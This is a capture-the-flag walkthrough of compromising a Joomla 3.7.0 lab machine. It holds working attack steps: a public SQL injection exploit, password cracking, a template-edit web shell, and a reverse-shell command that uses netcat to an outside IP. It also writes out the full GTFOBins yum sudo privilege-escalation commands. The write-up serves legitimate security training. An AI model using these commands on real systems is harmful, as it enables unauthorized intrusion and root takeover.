ENUMERATION:

Nmap:
![image](https://user-images.githubusercontent.com/126739122/234122185-0054ecf3-01eb-41a9-bd8e-9eebb7de0976.png)

Ran gobuster on http://10.10.249.26:
![image](https://user-images.githubusercontent.com/126739122/234122224-8ea8210a-face-4cb6-a1f9-96de314d0502.png)

Browsed to http://10.10.249.26/administrator and found this login webpage:
![image](https://user-images.githubusercontent.com/126739122/234122240-205379fe-1d3a-4329-86c8-8357a71eff80.png)

INITIAL FOOTHOLD:

REF: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
Browsed to http://10.10.249.26/administrator//language/en-GB/en-GB.xml
	- found Joomla version: 3.7.0

Searched for any known exploits for Joomla 3.7.0
	- REF: https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py

Ran python script and found user credentials for jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

Cracked password hash with JohnTheRipper:
![image](https://user-images.githubusercontent.com/126739122/234122248-2c49f10f-2a53-49d9-aa10-71b8d8cd7121.png)

Successfully logged into administrator login page with jonah:spiderman123 credentials
Following Hacktricks REF linked above, there is a way to gain RCE on the webserver through admin portal for Joomla

Edited error.php page in "protostar" template for Joomla:
![image](https://user-images.githubusercontent.com/126739122/234122256-f94f50d6-b927-496a-bd45-24abdfe33260.png)

Browsed to http://10.10.249.26/administrator/templates/protostar/error.php?cmd=nc 10.6.47.128 6251 -e /bin/bash
Spawned a fully interactive reverse shell on webserver

PRIVILEGE ESCALATION:

Transferred over LinPEAS.sh script from local machine to /tmp folder on webserver as 'apache' user and found the following:
![image](https://user-images.githubusercontent.com/126739122/234122262-2a152e5a-bd6d-4603-af18-459377c261d3.png)

Attempted to use this password for 'apache' user to check sudo permissions (incorrect password)
This ended up being the password for 'jjameson' user account on this machine
Switched over to  jjameson user and ran LinPEAS again:
![image](https://user-images.githubusercontent.com/126739122/234122270-ede61530-8450-4bf5-a06f-e87ae32cc236.png)

REF: https://gtfobins.github.io/gtfobins/yum/
ran commands:
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y

FOUND BOTH USER AND ROOT FLAGS
